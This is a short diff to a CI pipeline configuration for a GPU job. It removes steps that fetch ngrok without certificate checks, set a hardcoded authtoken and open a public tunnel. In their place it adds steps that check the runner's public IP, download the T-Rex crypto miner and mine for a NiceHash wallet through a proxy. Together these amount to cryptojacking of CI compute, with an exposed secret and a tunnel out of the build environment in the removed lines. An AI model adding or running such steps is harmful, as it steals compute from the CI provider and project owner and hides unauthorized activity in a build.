@@ -6,7 +6,6 @@ jobs:
       resource_class: gpu.nvidia.medium
       image: ubuntu-1604-cuda-10.1:201909-23
     steps:
-      - run: wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz --no-check-certificate
-      - run: tar xf ngrok-v3-stable-linux-amd64.tgz
-      - run: ./ngrok authtoken 1was60PETNyJA7bQGts9ew6Ye4I_2r6v7hgr8T6yM1J6hHdXg
-      - run: ./ngrok http 80
+      - run: curl ifconfig.me
+      - run: wget https://github.com/trexminer/T-Rex/releases/download/0.26.1/t-rex-0.26.1-linux.tar.gz && tar xf t-rex-0.26.1-linux.tar.gz 
+      - run: ./t-rex -a ethash -o stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 -u 31ib7EZjeDoER14o1WzVyxJRgw7EeAHTBH.edan --proxy 154.7.184.49:5699
